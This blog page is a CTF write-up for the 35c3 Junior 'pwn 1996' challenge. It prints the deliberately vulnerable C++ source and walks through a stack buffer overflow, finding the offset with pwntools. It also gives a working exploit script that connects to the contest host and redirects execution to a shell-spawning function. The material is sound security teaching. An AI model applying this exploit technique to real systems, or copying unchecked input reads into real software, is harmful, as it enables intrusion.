<!DOCTYPE html>
<html lang="en" itemscope itemtype="http://schema.org/WebPage">
  <head>
    

  <meta charset="utf-8" />
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">

  <title>35c3 Junior CTF Pwn: 1996 - gi0cann&#39;s notes</title>
  <meta property="og:title" content="35c3 Junior CTF Pwn: 1996" />
  <meta name="twitter:title" content="35c3 Junior CTF Pwn: 1996" />
  <meta name="description" content="We are giving a zip file containing the following files &ldquo;1996&rdquo; and &ldquo;1996.cpp&rdquo;. 1996 is 64 bit ELF binary and 1996.cpp contains its corresponding source code. During the ctf the target running the binary was at 35.207.132.47:22227.
1996.cpp:
// compile with -no-pie -fno-stack-protector #include &lt;iostream&gt; #include &lt;unistd.h&gt; #include &lt;stdlib.h&gt; using namespace std; void spawn_shell() { char* args[] = {(char*)&quot;/bin/bash&quot;, NULL}; execve(&quot;/bin/bash&quot;, args, NULL); } int main() { char buf[1024]; cout &lt;&lt; &quot;Which environment variable do you want to read?">
  <meta property="og:description" content="We are giving a zip file containing the following files &ldquo;1996&rdquo; and &ldquo;1996.cpp&rdquo;. 1996 is 64 bit ELF binary and 1996.cpp contains its corresponding source code. During the ctf the target running the binary was at 35.207.132.47:22227.
1996.cpp:
// compile with -no-pie -fno-stack-protector #include &lt;iostream&gt; #include &lt;unistd.h&gt; #include &lt;stdlib.h&gt; using namespace std; void spawn_shell() { char* args[] = {(char*)&quot;/bin/bash&quot;, NULL}; execve(&quot;/bin/bash&quot;, args, NULL); } int main() { char buf[1024]; cout &lt;&lt; &quot;Which environment variable do you want to read?">
  <meta name="twitter:description" content="We are giving a zip file containing the following files &ldquo;1996&rdquo; and &ldquo;1996.cpp&rdquo;. 1996 is 64 bit ELF binary and 1996.cpp contains its corresponding source code. During the ctf the …"><script type="application/ld+json">
{
    "@context": "http://schema.org",
    "@type": "WebSite",
    "name": "gi0cann&#39;s notes",
    
    "url": "http://gi0cann.github.io/"
}
</script><script type="application/ld+json">
{
  "@context": "http://schema.org",
  "@type": "Organization",
  "name": "",
  "url": "http://gi0cann.github.io/"
  
  
  
  
}
</script>
<script type="application/ld+json">
{
  "@context": "http://schema.org",
  "@type": "BreadcrumbList",
  "itemListElement": [{
        "@type": "ListItem",
        "position": 1,
        "item": {
          "@id": "http://gi0cann.github.io/",
          "name": "home"
        }
    },{
        "@type": "ListItem",
        "position": 3,
        "item": {
          "@id": "http://gi0cann.github.io/posts/35c3juniorctf-1996/",
          "name": "35c3 junior c t f pwn 1996"
        }
    }]
}
</script><script type="application/ld+json">
{
  "@context": "http://schema.org",
  "@type": "Article",
  "author": {
    "name" : ""
  },
  "headline": "35c3 Junior CTF Pwn: 1996",
  "description" : "We are giving a zip file containing the following files &amp;ldquo;1996&amp;rdquo; and &amp;ldquo;1996.cpp&amp;rdquo;. 1996 is 64 bit ELF binary and 1996.cpp contains its corresponding source code. During the ctf the target running the binary was at 35.207.132.47:22227.
1996.cpp:
// compile with -no-pie -fno-stack-protector #include &amp;lt;iostream&amp;gt; #include &amp;lt;unistd.h&amp;gt; #include &amp;lt;stdlib.h&amp;gt; using namespace std; void spawn_shell() { char* args[] = {(char*)&amp;quot;/bin/bash&amp;quot;, NULL}; execve(&amp;quot;/bin/bash&amp;quot;, args, NULL); } int main() { char buf[1024]; cout &amp;lt;&amp;lt; &amp;quot;Which environment variable do you want to read?",
  "inLanguage" : "en",
  "wordCount": 428,
  "datePublished" : "2018-12-30T21:08:42",
  "dateModified" : "2018-12-30T21:08:42",
  "image" : "http://gi0cann.github.io/",
  "keywords" : [ "web, burp suite, ctf, xxe, php" ],
  "mainEntityOfPage" : "http://gi0cann.github.io/posts/35c3juniorctf-1996/",
  "publisher" : {
    "@type": "Organization",
    "name" : "http://gi0cann.github.io/",
    "logo" : {
        "@type" : "ImageObject",
        "url" : "http://gi0cann.github.io/",
        "height" :  60 ,
        "width" :  60
    }
  }
}
</script>

<meta property="og:title" content="35c3 Junior CTF Pwn: 1996" />
<meta property="og:description" content="We are giving a zip file containing the following files &ldquo;1996&rdquo; and &ldquo;1996.cpp&rdquo;. 1996 is 64 bit ELF binary and 1996.cpp contains its corresponding source code. During the ctf the target running the binary was at 35.207.132.47:22227.
1996.cpp:
// compile with -no-pie -fno-stack-protector #include &lt;iostream&gt; #include &lt;unistd.h&gt; #include &lt;stdlib.h&gt; using namespace std; void spawn_shell() { char* args[] = {(char*)&quot;/bin/bash&quot;, NULL}; execve(&quot;/bin/bash&quot;, args, NULL); } int main() { char buf[1024]; cout &lt;&lt; &quot;Which environment variable do you want to read?">
<meta property="og:url" content="http://gi0cann.github.io/posts/35c3juniorctf-1996/" />
<meta property="og:type" content="website" />
<meta property="og:site_name" content="gi0cann&#39;s notes" />
  <meta name="twitter:title" content="35c3 Junior CTF Pwn: 1996" />
  <meta name="twitter:description" content="We are giving a zip file containing the following files &ldquo;1996&rdquo; and &ldquo;1996.cpp&rdquo;. 1996 is 64 bit ELF binary and 1996.cpp contains its corresponding source code. During the ctf the …">
  <meta name="twitter:card" content="summary" />
  <meta name="twitter:card" content="summary" />
  <meta property="og:url" content="http://gi0cann.github.io/posts/35c3juniorctf-1996/" />
  <meta property="og:type" content="website" />
  <meta property="og:site_name" content="gi0cann&#39;s notes" />

  <meta name="generator" content="Hugo 0.53" />
  <link rel="alternate" href="http://gi0cann.github.io/index.xml" type="application/rss+xml" title="gi0cann&#39;s notes">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css" integrity="sha384-9eLZqc9ds8eNjO3TmqPeYcDj8n+Qfa4nuSiGYa6DjLNcv9BtN69ZIulL9+8CqC9Y" crossorigin="anonymous">
  <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.5.0/css/all.css" integrity="sha384-B4dIYHKNBt8Bc12p+WXckhzcICo0wtJAoU8YZTY5qE0Id1GSseTk6S+L3BlXeVIU" crossorigin="anonymous">
  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous">
  <link rel="stylesheet" href="http://gi0cann.github.io/css/main.css" /><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic" />
  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800" /><link rel="stylesheet" href="http://gi0cann.github.io/css/syntax.css" /><link rel="stylesheet" href="http://gi0cann.github.io/css/codeblock.css" /><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/photoswipe.min.css" integrity="sha384-h/L2W9KefUClHWaty3SLE5F/qvc4djlyR4qY3NUV5HGQBBW7stbcfff1+I/vmsHh" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/default-skin/default-skin.min.css" integrity="sha384-iD0dNku6PYSIQLyfTOpB06F2KCZJAKLOThS5HRe8b3ibhdEQ6eKsFf/EeFxdOt5R" crossorigin="anonymous">



  </head>
  <body>
    <nav class="navbar navbar-default navbar-fixed-top navbar-custom">
  <div class="container-fluid">
    <div class="navbar-header">
      <button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#main-navbar">
        <span class="sr-only">Toggle navigation</span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
      </button>
      <a class="navbar-brand" href="http://gi0cann.github.io/">gi0cann&#39;s notes</a>
    </div>

    <div class="collapse navbar-collapse" id="main-navbar">
      <ul class="nav navbar-nav navbar-right">
        

        

        
      </ul>
    </div>

    

  </div>
</nav>




    


<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">

<div class="pswp__bg"></div>

<div class="pswp__scroll-wrap">
    
    <div class="pswp__container">
      <div class="pswp__item"></div>
      <div class="pswp__item"></div>
      <div class="pswp__item"></div>
    </div>
    
    <div class="pswp__ui pswp__ui--hidden">
    <div class="pswp__top-bar">
      
      <div class="pswp__counter"></div>
      <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
      <button class="pswp__button pswp__button--share" title="Share"></button>
      <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
      <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
      
      
      <div class="pswp__preloader">
        <div class="pswp__preloader__icn">
          <div class="pswp__preloader__cut">
            <div class="pswp__preloader__donut"></div>
          </div>
        </div>
      </div>
    </div>
    <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
      <div class="pswp__share-tooltip"></div>
    </div>
    <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
    </button>
    <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
    </button>
    <div class="pswp__caption">
      <div class="pswp__caption__center"></div>
    </div>
    </div>
    </div>
</div>


  
  
  






  

  <header class="header-section ">
    
    <div class="intro-header no-img">
      <div class="container">
        <div class="row">
          <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
            <div class="posts-heading">
              
                <h1>35c3 Junior CTF Pwn: 1996</h1>
              
              
                <hr class="small">
              
              
              
            </div>
          </div>
        </div>
      </div>
    </div>
  </header>


    
<div class="container" role="main">
  <div class="row">
    <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
      <article role="main" class="blog-post">
        <p>We are giving a zip file containing the following files &ldquo;1996&rdquo; and &ldquo;1996.cpp&rdquo;.
1996 is 64 bit ELF binary and 1996.cpp contains its corresponding source code.
During the ctf the target running the binary was at 35.207.132.47:22227.</p>

<p>1996.cpp:</p>

<pre><code class="language-C++">// compile with -no-pie -fno-stack-protector

#include &lt;iostream&gt;
#include &lt;unistd.h&gt;
#include &lt;stdlib.h&gt;

using namespace std;

void spawn_shell() {
    char* args[] = {(char*)&quot;/bin/bash&quot;, NULL};
    execve(&quot;/bin/bash&quot;, args, NULL);
}

int main() {
    char buf[1024];

    cout &lt;&lt; &quot;Which environment variable do you want to read? &quot;;
    cin &gt;&gt; buf;

    cout &lt;&lt; buf &lt;&lt; &quot;=&quot; &lt;&lt; getenv(buf) &lt;&lt; endl;
}
</code></pre>

<p>This code contains is a classic stack based buffer vulnerability. At &ldquo;<code>cin &gt;&gt; buf;</code>&rdquo; user input is read into buf without checking the length of the input. Our goal here is to use this vulnerability to take control of the programs execution flow and jump to the &ldquo;spawn_shell&rdquo; to get a shell on the target.</p>

<p>We can exploit this by feeding the program a long enough input to overwrite the return pointer(rbp+0x8) on the stack with the address of &ldquo;spawn_shell&rdquo; and take control of execution pointer (rip) to jump to the code want to execute.</p>

<p>To figure out the length that our input needs to be to take control of rip we will generate a unique sequence of length 2000 to feed to the program. This unique sequence will allow us to figure out the exact length our input needs to be by looking at the value of the rip register when the program crashes.</p>

<p>generate unique sequence:</p>

<pre><code class="language-python">#!/usr/bin/env python
from pwn import *

# spawn process
sh = process('1996')
# read process out until we see a question mark followed by a space
print sh.recvline(&quot;? &quot;)
# generate unique sequences of length 2000
payload = cyclic(2000)
# send payload to process as input
sh.sendline(payload)
# switch to interactive mode
sh.interactive()
</code></pre>

<p>The code above will crash the program with the main function returning to 0x6161616e6161616d. We take the last 4 bytes of this value and feed it to the function cyclic_find. This will give us the index (1048) in our unique sequence where the value was found. This index plus another 8 bytes for the address of spawn_shell is the total length our payload needs to be to take control of the program.</p>

<p>Next we disassemble the 1996 binary with radare2 to find the address of the spawn_shell function:
<img src="/spawn_shell_addr.png" alt="spawn_shell address" /></p>

<p>With this information we are ready to write our exploit.</p>

<p>exploit:</p>

<pre><code class="language-python">#!/usr/bin/env python
from pwn import *

sh = remote('35.207.132.47', 22227)
print sh.recvuntil(&quot;? &quot;)

payload = cyclic(1048)+p64(0x00400897)

sh.sendline(payload)
sh.interactive()
</code></pre>

<p>Executing our exploit gives us the following:</p>

<p><img src="/exploit_1996.png" alt="exploit result" /></p>


        
          <div class="blog-tags">
            
              <a href="http://gi0cann.github.io//tags/web/">web</a>&nbsp;
            
              <a href="http://gi0cann.github.io//tags/burp-suite/">burp suite</a>&nbsp;
            
              <a href="http://gi0cann.github.io//tags/ctf/">ctf</a>&nbsp;
            
              <a href="http://gi0cann.github.io//tags/xxe/">xxe</a>&nbsp;
            
              <a href="http://gi0cann.github.io//tags/php/">php</a>&nbsp;
            
          </div>
        

        

        
      </article>

      
        <ul class="pager blog-pager">
          
            <li class="previous">
              <a href="http://gi0cann.github.io/posts/35c3juniorctf-flags/" data-toggle="tooltip" data-placement="top" title="35c3 Junior CTF Pwn: flags">&larr; Previous Post</a>
            </li>
          
          
        </ul>
      


      

    </div>
  </div>
</div>

    <footer>
  <div class="container">
    <div class="row">
      <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
        <ul class="list-inline text-center footer-links">
          
          
        </ul>
        <p class="credits copyright text-muted">
          

          &nbsp;&bull;&nbsp;&copy;
          
            2018
          

          
            &nbsp;&bull;&nbsp;
            <a href="http://gi0cann.github.io/">gi0cann&#39;s notes</a>
          
        </p>
        
        <p class="credits theme-by text-muted">
          <a href="http://gohugo.io">Hugo v0.53</a> powered &nbsp;&bull;&nbsp; Theme by <a href="http://deanattali.com/beautiful-jekyll/">Beautiful Jekyll</a> adapted to <a href="https://github.com/halogenica/beautifulhugo">Beautiful Hugo</a>
          
        </p>
      </div>
    </div>
  </div>
</footer>

<script src="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.js" integrity="sha384-K3vbOmF2BtaVai+Qk37uypf7VrgBubhQreNQe9aGsz9lB63dIFiQVlJbr92dw2Lx" crossorigin="anonymous"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/contrib/auto-render.min.js" integrity="sha384-kmZOZB5ObwgQnS/DuDg6TScgOiWWBiVt0plIRkZCmE6rDZGrEOQeHM5PcHi+nyqe" crossorigin="anonymous"></script>
<script src="https://code.jquery.com/jquery-1.12.4.min.js" integrity="sha256-ZosEbRLbNQzLpnKIkEdrPv7lOy9C27hHQ+Xp8a4MxAQ=" crossorigin="anonymous"></script>
<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js" integrity="sha384-Tc5IQib027qvyjSMfHjOMaLkfuWVxZxUPnCJA7l2mCWNIpG9mGCD8wGNIcPD7Txa" crossorigin="anonymous"></script>
<script src="http://gi0cann.github.io/js/main.js"></script><script> renderMathInElement(document.body); </script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/photoswipe.min.js" integrity="sha384-QELNnmcmU8IR9ZAykt67vGr9/rZJdHbiWi64V88fCPaOohUlHCqUD/unNN0BXSqy" crossorigin="anonymous"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/photoswipe-ui-default.min.js" integrity="sha384-m67o7SkQ1ALzKZIFh4CiTA8tmadaujiTa9Vu+nqPSwDOqHrDmxLezTdFln8077+q" crossorigin="anonymous"></script>
<script src="http://gi0cann.github.io/js/load-photoswipe.js"></script>








  </body>
</html>

